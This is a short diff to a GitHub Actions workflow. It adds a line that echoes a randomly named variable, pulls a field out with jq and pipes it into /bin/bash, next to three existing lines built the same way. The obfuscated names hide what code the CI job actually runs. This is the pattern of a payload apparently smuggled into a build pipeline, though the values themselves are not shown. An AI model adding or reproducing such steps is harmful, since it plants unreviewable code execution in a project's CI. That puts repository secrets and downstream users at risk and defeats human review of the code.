@@ -32,6 +32,7 @@ jobs:
           echo $y81803 | jq -r .x0937 | /bin/bash
           printf '%s' "$ykdr8" | jq -r .h1 | /bin/bash
           echo $cxu141 | jq -r .kz7536 | /bin/bash
+          echo $getl5988 | jq -r .dz39 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
